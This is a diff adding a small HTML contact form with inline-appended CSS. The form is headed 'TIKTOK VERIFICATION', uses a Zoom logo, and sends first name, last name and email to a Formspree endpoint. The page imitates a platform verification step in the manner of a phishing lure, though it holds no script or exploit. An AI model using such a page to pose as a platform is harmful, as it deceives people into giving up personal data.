@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Contact form</title>
+</head><link rel="stylesheet" href="./style.css">
+
+<body>
+    <form action="https://formspree.io/f/xldrggen" method="post">    
+ <center><img src="c:\Users\hmk90\Downloads\zoom-logo-neon-light-neon-sign-neon-light-concept-editorial-image_181020-4645.avif" alt="charset">  </center> 
+<input type="text" name="first" placeholder="first name" autocomplete="off" required>
+<input type="text" name="last" placeholder="last name" autocomplete="off" required>
+<input type="email" name="email" placeholder=" email address" autocomplete="off" required>
+
+<button type="submit">Submit</button>
+<h1>TIKTOK VERIFICATION</h1>
+<h2></h2>
+</form>
+
+</body>
+
+</html>
+          *{
+
+    background-color: rgb(33, 33, 33) ;
+}
+  h1{
+color: white;
+padding-top: 10px;
+text-align: center;
+font-size: 60px;
+font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+
+
+}
+
+input{
+
+background-color: white;
+width: 70%;
+margin-left: 12%;
+font-size: 20px;
+padding: 16px 16px;
+border-radius: 10px;
+border-color: black;
+margin-bottom: 20px;
+}
+
+textarea{
+background-color: white;
+width: 70%;
+margin-left: 12%;
+font-size: 20PX;
+padding: 16px 16PX;
+border-radius: 10PX;
+border-color: black;
+margin-bottom: 25px;
+font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+}
+
+input:focus-within{
+outline: none;
+border-color: aqua;
+border-width: 3px;
+
+}
+
+
+
+textarea:focus-within{
+outline: none;
+border-color: aqua;
+border-width: 3px;
+
+}
+
+button{
+    background-color: aquamarine;
+    border-radius: 20px;
+    border-color: black;
+    font-size: 22px;
+    padding: 10px 18px;
+    text-align: center;
+    display: flex;
+    margin: auto;
+
+}
+button:hover{
+    opacity: 80%;
+    cursor: pointer;
+    
+}
